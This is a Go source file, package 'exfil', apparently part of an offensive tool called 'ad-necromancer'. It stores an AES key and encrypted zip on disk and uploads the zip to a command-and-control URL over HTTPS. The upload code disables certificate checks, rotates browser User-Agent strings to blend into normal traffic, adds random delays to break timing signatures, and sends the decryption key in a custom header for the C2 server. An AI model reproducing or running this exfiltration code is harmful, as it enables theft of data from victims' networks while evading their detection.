package exfil

import (
	"bytes"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"time"

	"ad-necromancer/internal/crypto"
)

// KeyFileName returns the timestamped key filename for the current moment.
func KeyFileName() string {
	return "adn_key_" + time.Now().Format("20060102_150405") + ".key"
}

// SaveKey writes the AES-256 key hex to a timestamped .key file with
// read-only permissions (0400). Returns the filename used.
// The key is NEVER printed to stdout.
func SaveKey(ez *crypto.EncryptedZip, filename string) error {
	if err := os.WriteFile(filename, []byte(ez.KeyHex()), 0400); err != nil {
		return fmt.Errorf("write key file %s: %w", filename, err)
	}
	return nil
}

// SaveLocal writes the encrypted zip to disk as adn_data.zip.
func SaveLocal(ez *crypto.EncryptedZip, path string) error {
	if path == "" {
		path = "adn_data.zip"
	}
	if err := os.WriteFile(path, ez.Data, 0600); err != nil {
		return fmt.Errorf("write %s: %w", path, err)
	}
	return nil
}

// userAgents is a pool of realistic User-Agent strings to blend into normal traffic.
var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0",
	"Microsoft-WNS/10.0",
	"winhttp/1.0",
}

// UploadHTTPS POSTs the encrypted zip to a C2 URL over HTTPS.
// Randomizes User-Agent and adds a random delay before sending.
func UploadHTTPS(ez *crypto.EncryptedZip, url string) error {
	// Random pre-exfil delay (1-5s) to break timing signatures
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	delay := time.Duration(1000+r.Intn(4000)) * time.Millisecond
	time.Sleep(delay)

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		},
		Timeout: 60 * time.Second,
	}

	req, err := http.NewRequest("POST", url, bytes.NewReader(ez.Data))
	if err != nil {
		return fmt.Errorf("request build: %w", err)
	}

	// Pick a random UA
	req.Header.Set("User-Agent", userAgents[r.Intn(len(userAgents))])
	req.Header.Set("Content-Type", "application/octet-stream")
	// Include key as a custom header so the C2 can decrypt
	req.Header.Set("X-Session-Key", ez.KeyHex())
	req.ContentLength = int64(len(ez.Data))

	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("upload: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode >= 400 {
		return fmt.Errorf("C2 returned HTTP %d", resp.StatusCode)
	}
	return nil
}
